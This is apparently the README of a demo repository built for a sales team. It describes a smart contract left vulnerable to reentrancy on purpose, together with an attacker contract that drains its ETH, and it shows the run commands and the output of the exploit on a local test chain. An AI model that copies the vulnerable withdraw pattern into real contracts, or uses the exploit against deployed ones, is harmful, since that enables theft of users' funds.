# DEMO POC

The repository contains a scenerio based vulnerability PoC for the sales-team.

1. `Vulnerable.sol` : The contract has a functionality where users can deposit their native asset (ETH) to the contract and the contract allows them to withdraw after the period of `7 days.`

The contract has a [reentrancy vulnerability](https://hackernoon.com/hack-solidity-reentrancy-attack) on `withdraw()` functionality which could allow attacker to withdraw the more amount of native asset (ETH) then the initially deposited amount.

2. `Exploit.sol` : The contract was prepared by the attacker to exploit the vulnerability of the `Vulnerable.sol` contract to drain the native asset (ETH) from the contract.

-----

```bash
npm i
npx hardhat run scripts/poc.js
```

```bash  
Vulnerable contract has been deployed to : 0x5FbDB2315678afecb367f032d93F642f64180aa3
Balance of the victim on vulnerable contract :  50.0
[1] Current block timestamp before block fast-forward :  1661493170
[2] Current block timestamp after block fast-forward :  1662097970
===
 EXPLOIT START 
===
[exploit] BALANCE AFTER DEPOSITING THE AMOUNT :  50000000000000000000
[exploit] RECEIVED ETH :  50000000000000000000
[exploit] STEALING BALANCE OF :  10000000000000000000
[exploit] RECEIVED ETH :  10000000000000000000
```
